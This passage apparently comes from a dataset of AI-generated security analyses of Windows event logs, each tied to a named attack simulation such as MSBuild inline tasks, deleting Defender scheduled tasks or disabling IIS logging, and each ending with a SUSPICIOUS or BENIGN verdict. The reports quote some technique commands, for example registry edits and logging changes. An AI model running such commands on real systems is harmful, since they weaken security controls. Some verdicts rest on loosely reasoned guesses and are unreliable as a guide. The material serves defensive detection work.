   - The lack of command-line details for `powershell.exe` but its presence in conjunction with other rapid process executions needs questioning.
   - The temporary nature and lack of detail for some of the involved files (such as `MSIA30E.tmp`) elevate the potential risk.

4. **Recommendation**:
   - Further investigation is required to determine the purpose and legitimacy of the `data.007_EXE.msi` file and its source.
   - Check for any persistence mechanisms that may have been established using the Windows Registry or scheduled tasks.
   - Examine network traffic logs to determine if there were any unusual communications concurrent with these events.
   - Run a full antivirus scan and consider using specialized threat-hunting tools to further analyze the involved binaries.

**Resolution**: **SUSPICIOUS** - The logs contain activities that don't look right and need more investigation to rule out or confirm malicious intent."
Azure - Eventhub Deletion,"### Analysis of Windows Event Logs

**Indicators of Suspicious Activity:**

1. **PowerShell Activity:**
   - The PowerShell logs show usage of `ConvertTo-SecureString` and `New-Object System.Management.Automation.PSCredential`, followed by `Connect-AzureAD` and `Remove-AzEventHub`.
   - Usage of Azure PowerShell commands to connect with potentially empty credentials is suspicious and may imply an attempt to interact with or modify cloud resources without proper authorization. The script attempts to remove an Azure Event Hub, which suggests a deliberate attempt to disrupt Azure services.

2. **Process Execution in Sysmon Logs:**
   - Multiple instances of `PowerShell.exe` are executed with command-line usage that matches the suspicious PowerShell activity in PowerShell logs.
   - Additional process activities include `wevtutil.exe` and `conhost.exe` being executed several times. The frequent execution of `wevtutil.exe` can indicate log tampering or clearance attempts as it is a tool often used to manage Windows event logs.
   - `whoami.exe` execution while not inherently suspicious, combined with the other activities, may indicate checking user rights for potential privilege escalation.
   - The network service and installer routines for Windows services and Edge updates appear standard given the processes involving `svchost.exe` and Edge installer without other contextually malicious behaviors noted.

3. **Security Audit Logs:**
   - The security log indicates an attempt by the Microsoft Edge Updater process to perform an action typically associated with privilege use or modification (`EventID 4799`). While this might align with software update operations, it occurred adjacent to the suspicious PowerShell activity window, requiring further scrutiny.

### Assessment and Risk Identification:

The combination of scripting activities aiming to alter cloud configurations and unusual process executions, especially concerning Azure services, strongly suggests potential malicious exploitation or misconfiguration. Particularly, leveraging what appears as improperly handled credentials for sensitive Azure operations.

**Resolution: SUSPICIOUS**

While some activities may relate to legitimate administrative actions (like Microsoft Edge updates), the coincidence of subsequent PowerShell-based Azure modifications raises a flag that warrants further investigation. Especially given the disruptive nature of the PowerShell command attempting to remove an Event Hub. Further examination is needed to confirm the legitimacy of these actions and ensure no unauthorized access or actions compromise cloud infrastructure.

### Guidance on How to Proceed:

- **Immediate Actions:**
  - Audit AzureAD logs to confirm the presence and legitimacy of the credentials and determine if the operations on Azure resources were authorized.
  - Review and verify all AzureAD and Azure Service Principal credentials, especially for anomalies or compromises.
  - Assess whether any security policies have been altered in Azure, and verify the integrity of logs for tampering attempts.

- **Further Investigation:**
  - Investigate the purpose and legitimacy of the PowerShell script execution, identifying who initiated these commands and whether they align with standard operations.
  - Analyze the network connections from this machine around the event time to identify potential communication to unauthorized addresses or domains.
  - Scrutinize other system activities, especially concerning logs management (`wevtutil.exe`), looking for patterns of deletion or unauthorized access.

This assessment should guide the Security Operations Center in determining if further action is warranted, like incident response or forensic investigation."
MSBuild Bypass Using Inline Tasks (C#),"Based on the Sysmon logs provided, the following activities are notable and bear further analysis for potential malicious activity:

1. **Usage of PowerShell and Cmd**:
   - The invocation of `powershell.exe` and `cmd.exe` is logged multiple times:
     - `powershell.exe` was executed by the user `SERVER002\admin_test`. PowerShell is a powerful shell often used for system administration, but its misuse is a common vector for attacks, especially with regards to remote code execution or running scripts that can potentially perform malicious activities.
     - `cmd.exe` was used to invoke `msbuild.exe` with a project located in a temporary directory. `MSBuild` is another potentially risky tool as it could be used by adversaries to compile and execute code/shellcode from project files, leading to behavior such as code execution without writing an executable to disk.

2. **Unusual Use of MSBuild and Temp Locations**:
   - Execution of `MSBuild.exe` with a project file situated in a temp directory appears suspicious. This usage pattern has been observed in fileless malware attacks where malicious code is stored in temporary project files and compiled at runtime. It’s notable that the command executed under the user context `SERVER002\admin_test`.

3. **EdgeUpdate Behavior**:
   - Repeated invocation of `MicrosoftEdgeUpdate.exe` and related registration helper executable `MicrosoftEdgeUpdateComRegisterShell64.exe` is observed. The frequent invocation and presence in temporary directories could indicate a misuse or a hijack attempt, possibly aligned with adversaries’ attempt to use legitimate update mechanisms to deploy malicious payloads.

4. **Wevtutil Usage**:
   - The use of `wevtutil.exe` is prominent. This utility manages event logs and can be used by attackers to clear event logs to cover their tracks. The same user `SERVER002\admin_test` is responsible for executing this utility multiple times, which could be consistent with attempts to obscure malicious activity.

5. **Host-Based Enumeration**:
   - Execution of `whoami.exe` and `hostname.exe`, which suggest host reconnaissance activity. While these can be benign if run by legitimate administrators for troubleshooting or validation purposes, combined with the other noted behavior, they might reflect part of a broader enumeration or discovery phase by an attacker.

Considering all the evidence, the noted patterns, and known attack techniques using some of these tools and methods, I conclude that the logs contain potentially malicious activity (""MSBuild.exe"" usage, use of temp directories, and PowerShell/all `cmd.exe` invocations). Thus, further investigation and examination of the system and surrounding context (file contents, network traffic, etc.) are needed. The behavior aligns more closely with activities that could indicate an adversary is attempting to gain persistence or execute unauthorized actions.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed**:
- Investigate the origin and legitimacy of the `admin_test` account's activities.
- Analyze network logs for signs of data exfiltration or communication with known malicious endpoints.
- Review any PowerShell and Cmd line scripts or commands run, looking for obfuscation or known malicious patterns.
- Conduct an integrity check and validation of critical system binaries and update mechanisms to confirm authenticity.
- Monitor and possibly temporarily disable affected accounts and services until a thorough analysis is complete."
Create ADS PowerShell,"The provided logs from the Windows host require thorough analysis to determine any indicators of malicious activity. Here's a detailed breakdown of the events:

### Application Log
- **Microsoft-Windows-Security-SPP**: This log indicates the Software Protection Platform Service. The entries here don't show anything immediately suspicious; these are typical logs related to Windows licensing and protection mechanisms.
- **edgeupdate**: Multiple entries for ""Service stopped"" are logged. Microsoft Edge Update stopping its service might be benign, especially if it coincides with update activity, but further investigation on why it stopped is prudent.

### Windows PowerShell Log
- **PowerShell Events**: There are multiple entries indicating PowerShell commands. Notably, these commands involve writing to streams, specifically Alternate Data Streams (ADS), which can be a technique used by malware to hide data. The use of ADS should be scrutinized further; however, without malicious payload details, this alone isn't conclusively malicious.

### Sysmon Log
- **PowerShell Execution**: There's evidence of PowerShell executing with elevated privileges by the user `SERVER002\admin_test`. PowerShell scripting can be leveraged in attacks, especially if not used frequently by this account.
- **System Utility Executions**: Processes like `wevtutil.exe`, `conhost.exe`, and `sppsvc.exe` are expected in routine operations but seeing `wevtutil.exe` used extensively shortly after PowerShell activity is suspicious and can imply log manipulation attempts.
- **Microsoft Edge Update Activity**: Several entries indicate the execution of Microsoft Edge Update processes. These entries are expected during update processes but investigating their timeline and actions would be prudent to rule out misuse or tampering.

### Security Log
- **Privilege Events 4672**: This event indicates a logon session was granted special privileges, which is expected for SYSTEM-related activities. However, verifying such activities align with expected operations around the time frame can help decide if any privilege misuse occurred.
- **Logon Events 4624**: Typical system logon entries for accounts SYSTEM and others. Without unexpected logons or failed login attempts, these seem normal for system activity.
- **User Enumeration via Event 4798**: Displays querying of user account details. If not part of regular activity, it may suggest reconnaissance within the system.

### Assessment

- **Suspicious PowerShell Usage**: While there is the use of PowerShell that manipulates data streams, which can be a tactic used by malware, the logs do not provide enough detail to definitively conclude malicious intentions without additional context.
- **Edge and Service Activity**: Frequent edgeupdate and service log stops related to updates can be benign during scheduled updates but are worth reviewing against a timeline and patch management activities.

### Resolution

Based on the logs provided, I would classify the overall resolution as **SUSPICIOUS**. While there's no direct evidence of malicious behavior, the use of PowerShell with ADS, system utilities execution, and service activities warrant further monitoring and investigation. It is advised to:
1. Review the sources and permissions related to the PowerShell commands and verify against expected operations.
2. Check system update schedules and logs to confirm the stopping of edgeupdate services aligns with expected update timelines.
3. Investigate the impact and usage history for utilities such as `wevtutil.exe`.
4. Ensure all administrative credentials and system integrity are secure.

Proceed with caution, monitor for any new anomalies, and ensure comprehensive logging is enabled for potential correlation if suspicion remains."
Invoke CHM Simulate Double click,"In the provided Windows event logs, I have identified and analyzed various entries for any indicators of potentially malicious activity. Here is a detailed analysis:

1. **Execution of PowerShell Commands**: 
   - The logs show multiple instances of PowerShell being executed. Specifically, the commands include:
     - `powershell.exe & {Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm}`
     - `powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';`
     - `powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;`
   - The use of PowerShell with such command executions, especially with switches like `-Command` and invocation of scripts or commands like `Invoke-ATHCompiledHelp`, may suggest script-based operations.
   - The context and specific module usage could hint at an intended task related to interacting with or executing compiled help files, often associated with some form of automation or scripting for operations or, more concerningly, attempts to weaponize or explore compiled help files that can execute code.

2. **Privilege Levels**:
   - The PowerShell commands are executed under accounts such as `SERVER002\admin_test` and `NT AUTHORITY\SYSTEM`. The use of an account with 'High' integrity level and SYSTEM-level privilege indicates the ability to perform sensitive operations.

3. **Tool and Utility Usage**:
   - Instances of `wevtutil.exe` and `conhost.exe` can be seen. While `conhost.exe` is a legitimate Windows process used to provide a command line interface, and `wevtutil.exe` is used for event log management.
   - Legitimate tools and utilities are often misused in a tactic known as living-off-the-land, where threat actors use legitimate software to achieve their aim without detection.

4. **Windows Update Activities**:
   - The logs contain a series of Windows Update events, which seem normal and are associated with typical update processes. No suspicious update activity detected.

While there are several indicators such as specific PowerShell command executions that could be commonplace in legitimate system administration tasks, the context, privilege level, and lack of explicit clarity on intent may elevate suspicion. As PowerShell is a potent tool often used for task automation, quick problem-solving, and system management, its misuse in malicious contexts is well documented, particularly if the example commands were unfamiliar or unauthorized by system administrators or operators.

### Conclusion
- **Resolution**: **SUSPICIOUS**
- **Assessment**: The prevalent use of PowerShell with elevated privileges, alongside the invocation of certain commands, suggests activity that warrants a deeper investigation. Although not definitively malicious, these actions might be part of legitimate scripts or automation tools in use by system administrators. However, they could also be exploited for malicious operations. 

### Guidance
- **Next Steps**:
  - Confirm whether the PowerShell commands and tasks captured in the log reflect authorized or scheduled maintenance activities, perhaps checking with IT administrators or the system owners.
  - Cross-reference the PowerShell scripts and any related tasks with known benign scripts used within the environment.
  - Review account activity and access patterns for `SERVER002\admin_test` and any SYSTEM account actions around the time of the detected events.
  - Implement enhanced monitoring around PowerShell executions and log any use of administrative utilities such as `wevtutil.exe`.
  - Consider deploying PowerShell logging at script block level to capture full command usage for better transparency of operations.

This cautious approach aims to validate the nature of the detected activity while mitigating potential risks associated with compromise."
Delete an entire folder - Windows PowerShell,"Upon reviewing the provided Windows event logs, the following observations and assessments were made:

### Observations:

1. **Microsoft Edge Update Activities**:
   - Repeated activities related to the Microsoft Edge Update process (`MicrosoftEdgeUpdate.exe`) are logged.
   - The processes are running under the `NT AUTHORITY\SYSTEM` account, indicating high privilege execution which is consistent with legitimate software updates.
   - Various command-line arguments related to updating and registering components were observed. These activities align with typical update operations.

2. **Windows PowerShell Command Execution**:
   - A PowerShell command executes: `Remove-Item -Path $env:TEMP\deleteme_folder_data.004 -Recurse`.
   - The command appears to be cleaning temporary data which might be part of a routine cleanup process or script.

3. **Wevtutil and Conhost Processes**:
   - Multiple executions of `wevtutil.exe` and `conhost.exe`, both associated with `admin_test` user.
   - `Wevtutil.exe` is typically used for event log management and does not inherently suggest malicious activity unless used in a suspicious context.

4. **Process Execution under High Privilege**:
   - Various legitimate Windows processes (`hostname.exe`, `whoami.exe`, `powershell.exe`) are executed under `SERVER002\admin_test`, capturing user interaction and system state queries. These processes can be part of typical administration activities or scripts running under high privilege.

5. **Event Logs Stopping and Starting**:
   - `edgeupdate` service stops were noted in the log. This could correlate with the end of the update processes.

### Assessment:

The logs present typical software update behavior, especially related to Microsoft Edge Update. The PowerShell and command-line entries do not show indicators of malicious activity beyond common administrative tasks and software maintenance operations. No indicators of compromise such as unexpected privilege escalation, unauthorized access, or execution of known malicious binaries were identified.

### Conclusion:

- **Resolution**: **BENIGN**

### Guidance:

- Continue normal monitoring for any anomalies that deviate from established baselines.
- Ensure regular updates of system monitoring tools to detect new threats.
- Verify the context or tasks in which PowerShell commands are executed if further investigation is desired for audit purposes.

Overall, no signs of malicious activity are evident in the logs provided. The recorded activities are consistent with expected operations of an administrative nature and software updating procedures."
Read volume boot sector via DOS device path (PowerShell),"Analyzing the provided Windows event logs, here is a detailed breakdown of findings across different log types:

### System Log:
- **Windows Update Client Events:** The logs show a series of Windows Update events with Security Intelligence Updates for Microsoft Defender Antivirus. The updates seem to have been successfully applied. No anomalies or failed updates are recorded here, which is typically expected for a healthy update process.

### Application Log:
- **Edge Update:** There’s a log entry indicating that a service (likely EdgeUpdate) has stopped. This alone is not inherently suspicious, as services may stop as part of normal maintenance or updates.
- **Security Center:** The Windows Defender status is logged as ""SECURITY_PRODUCT_STATE_ON,"" suggesting that the antivirus protection is active and operational. There is no indication here of Defender being disabled or tampered with.

### Security Log:
- **Security Auditing (EventID 5379):** Multiple failed read operations with the return code `3221226021` are logged. This return code corresponds to an error, commonly associated with 'STATUS_OBJECT_NAME_NOT_FOUND'. While frequent failed attempts to read certain tokens or certificates can be a point of concern, the context here doesn't sufficiently point to malicious intent without additional corroborating suspicious activities or targets.

### Windows PowerShell Log:
- **Execution of PowerShell Script:** A sequence of PowerShell commands attempting file operations directly on drive ""C:\"" is captured. This includes reading the disk data directly, which is more characteristic of low-level disk operations often employed in advanced techniques like reconnaissance or malware activities. These operations should be investigated further as they appear atypical for benign administrative scripts.

### Sysmon Log:
- **Process Creation Events:** We see processes like `wmiprvse.exe`, `wevtutil.exe`, `conhost.exe`, and others that commonly run on Windows systems. However, notable here are:
  - Multiple entries of `wevtutil.exe` and `conhost.exe` running under the user `SERVER002\admin_test`, possibly indicating an administrative task or script execution.
  - The PowerShell process `powershell.exe` with direct disk read operations further flags concern tied to previous PowerShell log entries.

- **Program Execution under NT AUTHORITY\SYSTEM:** Observed execution of `MicrosoftEdgeUpdate.exe`, `dmclient.exe`, and `wuauclt.exe`, all appearing normal as part of routine system operations and updates.

### Summary Assessment:
The logs indicate largely normal Windows operational behavior with legitimate updates and security checks. However, the PowerShell activity reading direct physical disk sectors and the frequent failed authentication read operations (EventID 5379) from the Security log merit deeper scrutiny.

### Final Assessment: **SUSPICIOUS**

**Recommendation:** 
1. Conduct a deeper investigation into the PowerShell activities, especially focusing on the source, context, and any unintended changes to system resources.
2. Verify the intent and source of the `admin_test` account activity concerning process executions.
3. Monitor for any unusual outbound connections or data activities post-PowerShell execution as a precaution.
4. Ensure endpoint protection solutions are fully updated and consider additional scrutiny on accounts displaying such activities. 

Conclusively, while no solid malicious activity is apparent, the noted PowerShell execution and security errors warrant additional attention to rule out any latent threats or verify benign nature."
Delete Windows Defender Scheduled Tasks,"After carefully reviewing the provided logs, here’s an in-depth analysis considering potential indicators of malicious activity:

### System Log:
- The system logs mainly cover events related to time adjustments by `svchost.exe`. This process is a legitimate Windows system process that hosts multiple Windows services. The Kernel-General events show time changes reverting a short period and seem to involve synchronization with `time.windows.com`, a valid time source. There are no obvious indicators of compromise from these logs.

### Security Log:
- The security logs are also related to time changes. `C:\\Windows\\System32\\svchost.exe` is involved again, consistent with legitimate Windows operations. No anomalous behavior is evident from this.

### Application Log:
- The application log contains a routine entry about the Software Protection Platform Service, which indicates normal operation related to software licensing and protection checks.

### Sysmon Log:
- **Process Execution**: Several instances of `cmd.exe` are executed with command lines related to Windows Defender scheduled tasks. These include checks and deletions of Windows Defender tasks under the `SERVER002\\admin_test` user context.
- **Command-Line Arguments**: Notably, there’s extensive use of `schtasks` to query and delete tasks associated with Windows Defender. This could indicate an attempt to disable security features, which is a tactic often used by attackers to make the system more vulnerable or disable detection mechanisms.
- **Integrity Level and User Context**: The actions are performed with high integrity levels, indicating administrative privileges. This raises a red flag if the operations weren’t scheduled or authorized as part of standard administrative tasks.

### Key Observations:
1. **Command Execution**: The series of `schtasks` commands to delete significant Windows Defender tasks is suspicious, particularly if these are not standard maintenance routines.
2. **User Context**: Activities are carried out by `SERVER002\\admin_test` account, which should be verified if its usage is expected during this period.
3. **High Integrity Level**: Indicates the potential for privilege misuse or escalation of privileges if not legitimately planned.

### Assessment:
Given the nature of querying and removing scheduled tasks related to security (`Windows Defender`), this potentially out-of-place activity aligns with attempts to weaken a system’s defenses. Actions like these are commonly associated with attackers attempting to gain further undetected access or maintain persistence on a system by disabling or disrupting security measures.

### Resolution:
- **SUSPICIOUS**: The events signify potentially unauthorized activities that indeed warrant further investigation. Administrators should verify whether these actions were part of a scheduled script or manual maintenance job. If not, the `admin_test` account could potentially be compromised, necessitating password changes and enhanced scrutiny of user and process behavior logs.

### Guidance:
- Investigate the legitimacy of the `server002\admin_test` actions during the period in question.
- Review user account activities for any signs of unauthorized use.
- Verify if there were any legitimate requests or policies in place that would've justified the deletion of Windows Defender tasks.
- Consider tightening access controls and monitoring around administrative accounts and conduct a security audit on scheduled tasks to ensure they comply with security policies."
Msiexec.exe - Execute the DllUnregisterServer function of a DLL,"Upon analyzing the provided Windows event logs, particularly the Sysmon log events, I observed a series of activities that could potentially indicate suspicious behavior. Here is a detailed analysis:

### Analysis:

1. **Repeated Usage of PowerShell and Command-Line Utilities**:
   - The logs show multiple instances of `powershell.exe`, `wevtutil.exe`, and `cmd.exe`. While these utilities are commonly used for legitimate administration tasks, they are also frequently used by attackers for malicious purposes.
   - The execution of `msiexec.exe` with the parameters suggest it might attempt to run or install a DLL (`MSIRunner.dll`) from a temporary directory, which is unusual for legitimate operations.

2. **Execution of wevtutil.exe**:
   - `wevtutil.exe` is used to export, configure, and manipulate Windows event logs. It executing multiple times could suggest an attempt to clear or manipulate logs to cover tracks.

3. **High Integrity Level Execution**:
   - Various processes ran with 'High' integrity level, providing them elevated privileges. Usage of tools like `whoami.exe` (identifying user context) under high privilege could be for reconnaissance or privilege escalation attempts.

4. **EdgeUpdate and Microsoft Edge Update Setup**:
   - There are several executions of processes related to Microsoft Edge update. Typically, these should not appear too frequently and might indicate either a problem in update implementation or manipulation where a legitimate-looking process is being used for unauthorized purposes.

### Conclusion:

The combination of these factors—unusual PowerShell executions, invocation of utilities like `wevtutil.exe` possibly for log manipulation, `msiexec.exe` running a DLL from a temp directory, and multiple repeated executions involving both PowerShell and Edge update processes—suggests that there is activity warranting further investigation. This is especially true considering the usage of elevated privileges and processes running with 'High' integrity level. The activity might not necessarily be outright malicious but given the context, it requires closer scrutiny.

### Resolution: **SUSPICIOUS**

**Recommendations**:
1. **Further Investigation**:
   - Examine the context and content of PowerShell commands that were executed.
   - Check if `wevtutil.exe` cleared or altered logs.
   - Investigate the origin and purpose of the `MSIRunner.dll`.
   - Verify the Edge update processes and logs to ensure they are not being misused.

2. **Review Recent Changes**:
   - Review any user actions, scheduled tasks, or software installations around the logged times for irregular patterns.

3. **Implementation of Monitoring**:
   - Enhance monitoring on critical server activities involving high-integrity processes and command-line executions.

4. **Conduct a Threat Hunt**:
   - Given the unusual activity, conducting a thorough threat hunt on the network and systems could help identify hidden or evolving threats more effectively.

Overall, while the activity isn't definitively malicious, its anomalous nature cannot be ignored, necessitating a deeper investigation to rule out any potential threats."
Allow Simultaneous Download Registry,"## Analysis of Windows Sysmon Logs

After analyzing the provided Sysmon logs for the Windows host (Server002), the following observations were made:

1. **Frequent use of the wevtutil.exe and conhost.exe:**
   - There were multiple instances where processes `wevtutil.exe` and `conhost.exe` were executed back-to-back with minimal intervals. These operations were performed by the user `SERVER002\admin_test`.
   - `wevtutil.exe` is typically used for managing Windows Event Logs, which could be legitimate but might be used maliciously for log tampering or extraction.

2. **Execution of HOSTNAME.EXE and WHOAMI.EXE:**
   - The logs show the execution of standard Windows utilities, such as `HOSTNAME.EXE` and `WHOAMI.EXE`, which are used to retrieve the machine's host name and the current logged-on user's information, respectively.
   - Their execution is common for enumeration activities, which could be normal administrative actions or potentially suspicious if executed in certain contexts.

3. **Registry modifications via cmd.exe and reg.exe:**
   - A `cmd.exe` process was executed with command-line arguments to modify registry settings related to Internet Explorer's connection limits:
     - `HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\MaxConnectionsPerServer`
     - `HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\MaxConnectionsPer1_0Server`
   - The modification of these keys using `cmd.exe` is noteworthy as it may indicate script-based automation or potentially unauthorized configuration changes. Such changes could be benign or could be associated with performance tuning or preparation for data exfiltration.

4. **Scheduled service standard processes:**
   - Processes such as `svchost.exe`, `sppsvc.exe`, `TiWorker.exe`, and `TrustedInstaller.exe` were all observed executing under their expected contexts and users (SYSTEM or NETWORK SERVICE), indicating likely benign action related to routine system operations.

5. **Microsoft Edge Update Process:**
   - The logs also show the execution of `MicrosoftEdgeUpdate.exe`, which is expected behavior for systems where Microsoft Edge is installed and set to update automatically.

## Assessment and Conclusion

- **SUSPICIOUS:** The registry modifications combined with the frequent execution of tools like `wevtutil.exe` and `conhost.exe` could point towards suspicious activities, especially considering these actions are usually background tasks or done infrequently. The context and timing of these actions may warrant further investigation to rule out malicious intent. 
- There isn't clear evidence of malware or compromise from the logs provided, but the unusual patterns of behavior justify a deeper inspection of user actions, especially those tied to `SERVER002\admin_test`.
- **Guidance for Next Steps:**
  - **Investigate the context** in which the suspicious commands were executed: Check if these actions align with legitimate administrative tasks.
  - **Correlate with user activity logs** to verify whether activities such as registry modifications were scheduled or sanctioned.
  - **Check for additional indicators** in other logs or endpoint solutions (e.g., AV, EDR) for more context around the time of these activities.
  - **Verify the destination and source of any scripts or scheduled tasks** that may have led to the modifications and frequent executions observed in the logs.

This assessment advises that further analysis and correlation be conducted to ensure that these activities are not indicative of a security threat."
Disable Windows IIS HTTP Logging via PowerShell,"Upon analyzing the provided Windows event logs for Server002, I have observed several noteworthy points requiring attention:

1. **Application Log:**
   - Service stopping (`edgeupdate` service) messages are present, although they are generally benign and part of routine operations.

2. **Security Log:**
   - Event ID 4616 indicates changes in system time, which is often normal but can be concerning if unauthorized. The time changes were very slight and close together, implying potential time synchronization adjustments.

3. **Sysmon Log:**
   - We observe the use of `whoami.exe`, which is a legitimate utility often used to verify the username and domain of the user account. This doesn't inherently suggest malicious intent but can be part of reconnaissance for account details, pending additional context.
   - The PowerShell script with command `set-WebConfigurationProperty` to modify IIS logging behavior (`dontLog`) raises immediate suspicion. Alteration of logging policies is a well-known tactic used by malicious actors to cover their tracks after unauthorized access.
   - Frequent usage of `MicrosoftEdgeUpdate.exe`, correlates with application updates, and does not show signs indicative of tampering or misuse beyond routine update operations. This continues alongside the command-line arguments, also appearing normal for this context.

4. **Windows PowerShell Log:**
   - The use of PowerShell to execute the script that modifies logging settings further supports the suspicion of potentially malicious behavior, especially if it's set to avoid recording certain transactions within the Server's web traffic logs.

**Assessment:**

- **Anomalous Behavior:**
  - The execution of a PowerShell command that adjusts logging settings is particularly notable and raises concerns. This may suggest an attempt to bypass or disable logging for HTTP traffic on the web server (`Default Web Site`), which aligns with tactics used to obfuscate activities and avoid detection.

- **Indicators of Malicious Activity:**
  - The observed behavior of the IIS logging configuration modification through PowerShell can be associated with malicious activities. 

**Resolution: SUSPICIOUS**

- Although the presence of regular system operations (such as Edge Update processes) is benign, the specific PowerShell command aimed at altering server logging behavior is suspicious and warrants a detailed investigation to determine if it was authorized and compliant with organizational policies.

**Guidance:**
- Review the context surrounding the PowerShell command execution: who executed it and why.
- Validate if there were any authorized changes or incidents during this timeframe that may explain the need for such a PowerShell script.
- Consider reviewing additional logs and network activities to detect any anomalous behavior in conjunction with this event. A more in-depth forensic review of related user actions and network traffic might be necessary.
- Assess if any deviations in user behavior or other security incidents correspond with these findings."
Enforce Smart Card Authentication Through Registry,"Upon reviewing the provided Windows event logs, I've identified several pieces of information that suggest possible indicators of suspicious or malicious activity. 

1. **Process Execution & Command-Line Arguments:**

   - **Suspicious Command Usage:** The Sysmon logs show execution of several processes related to `wevtutil.exe` and `cmd.exe`:
     - We observe multiple instances of the `wevtutil.exe` process being executed by the user `SERVER002\admin_test`. `wevtutil.exe` is typically used for managing event logs, and repeated usage without a legitimate reason can indicate log clearing attempts or exfiltration.
     - An instance of `cmd.exe` executed with a command-line argument to modify the registry: `""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f`. Modification of policies via the registry, especially under `Policies\System`, could be harmful or used for privilege escalation.
     - The subsequent execution of `reg.exe` performing a registry add operation indicates further that registry modifications were carried out, aligning with potential unauthorized configuration changes.

2. **Privilege Levels:**
   
   - Multiple high-integrity level processes are executed, including `cmd.exe` which suggests administrative-level tasks were carried out, possibly indicating privilege escalation or exploitation of administrative rights.

3. **Process Anomalies:**

   - The execution path of `MicrosoftEdgeUpdate.exe` from a temporary directory (`C:\\Program Files (x86)\\Microsoft\\Temp\\EU4B09.tmp`) is unconventional for a system process, which typically resides in a more standard installation path. This could indicate an attempt to obfuscate malicious activities through process masquerading.

4. **Time Manipulation:**

   - The system and security logs indicate time modification events (`EventID 4616`). Changing the system time could be used to cover tracks by altering timestamps on logs or files.

5. **Network Services & Trusted Installer:**

   - While `sppsvc.exe` and `TrustedInstaller.exe` may appear normal, any unusual behavior or auxiliary evidence in conjunction with these logs might enhance the suspicion if these services are involved in unauthorized installations or actions.

Overall, the combination of registry modifications via command-line, the unconventional execution paths, potential log management tool misuse, and system time alterations supports the conclusion of suspicious activities that require further investigation.

**Resolution:** SUSPICIOUS

**Guidance:** Further investigation is necessary to determine the full context and scope of the logs. Steps should include reviewing user activity around the `SERVER002\admin_test` account for other anomalies, examining network connections, and validating the integrity of the involved binaries. Additionally, correlate these logs with other security tools or systems (e.g., Endpoint Detection and Response) for a comprehensive analysis."
Decompile Local CHM File,"Based on the provided logs, we need to look into certain behaviors that may indicate suspicious or potentially malicious activities. Here are some observations derived from the Sysmon logs:

1. **Frequent Process Creation with PowerShell:**
   - The log shows repetitive invocation of `powershell.exe` by the same user `SERVER002\admin_test`. PowerShell is a powerful tool often used by attackers due to its scripting capabilities. Although the logs do not show specific commands executed, high frequency or unusual use of PowerShell should be carefully monitored. 
   
2. **Use of `wevtutil.exe`:**
   - The usage of `wevtutil.exe` is noteworthy. This tool is typically used for managing event logs and is often leveraged by attackers to clear logs to cover tracks. The log includes its execution by an administrative user.
   
3. **Suspicious Command Execution:**
   - There is a command execution involving `cmd.exe` which launches `hh.exe` to decompile CHM files in a temporary directory: `""cmd.exe"" /c hh.exe -decompile %%temp%% ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.001\\src\\data.001.chm""`. Decompiling CHM files can be used to extract embedded scripts or content and can indicate a technique to execute malicious actions.

4. **Edge Update Repeatedly Executing and Registering:**
   - There are multiple executions and registrations of `MicrosoftEdgeUpdate.exe` processes, which appears legitimate. However, parts of the process occur in temporary directories (e.g., `Microsoft\\Temp\\EU95AE.tmp`). An attacker might leverage such processes, but in this instance, given the consistency in logging and the lack of additional suspicious indicators, this seems to be consistent with a standard update operation.

5. **Use of `whoami.exe` and `hostname.exe`:**
   - These tools were executed. While they are benign on their own, in combination with other suspicious activities, they might be used to check user privileges or retrieve system information by an attacker script.

Given these observations, my assessment of the situation is as follows:

- **SUSPICIOUS**: The activities observed raise several red flags that warrant further investigation, especially the use of PowerShell and event utility manipulation. The environment's history, user activity patterns, used command lines, and the context of software updates should be checked.

**Guidance:**
- It is advisable to check the specific PowerShell commands executed and scrutinize potential malicious scripts or unauthorized tasks running under the `admin_test` account.
- Enforce strict logging and monitor future usage of critical processes (`powershell.exe`, `wevtutil.exe`, etc.).
- Review access control and permissions for the administrative user accounts involved.
- Ensure antivirus and endpoint security solutions are updated and properly configured to intercept common attack techniques."
Setting Shadow key in Registry for RDP Shadowing,"Upon analyzing the provided Windows event logs from the Security, Sysmon, Application, Windows PowerShell, and System logs, certain events stand out as being potentially indicative of malicious activity. Here's a breakdown of the findings:

### Security Log Analysis:
1. **Suspicious Privileges (EventID: 4672)**
   - The user ""admin_test"" logs on with a high number of privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeImpersonatePrivilege` which can be exploited for malicious purposes to manipulate processes or impersonate users.
   
2. **Remote Authentication (EventID: 4624)**
   - A successful login via NTLM from a remote workstation (""DESKTOP-3HL5B2P"") could indicate a lateral movement if not initiated by an authorized user.

### Sysmon Log Analysis:
1. **Process Execution Patterns**
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` being executed in quick succession. While these can be legitimate, frequent usage might indicate an attempt to manipulate event logs.
   - The execution of `powershell.exe` with a complex script involving firewall rule modifications and registry changes is highly suspicious. The script involves enabling remote desktop rules and setting registry values, indicative of efforts to persist or enable remote control capabilities.

2. **Command Execution (Process: PowerShell)**
   - The PowerShell command involves accessing CIM/WMI objects, invoking methods, and modifying firewall rules to enable ""Remote Desktop - Shadow"" (TCP-In). This command line is complex and reflects behavior that is often seen in attacks aiming for remote access or control.

### Application Log Analysis:
- Stopping of the EdgeUpdate service is shown but does not immediately indicate malicious behavior. However, it should be correlated with other logs for further insights.

### PowerShell Log Analysis:
- There is evidence of detailed registry modification via PowerShell, matching the suspicious execution found in Sysmon logs. The action targets remote desktop configurations on the host, indicating attempts to maintain persistence or access.

### System Log Analysis:
- No significant entries to note due to the absence of content.

### Conclusion:
Based on the detected actions such as privilege escalations, suspicious PowerShell execution scripts aimed at enabling additional remote capabilities, and the potential for log manipulation, there is strong evidence pointing towards malicious activity.

### Resolution:
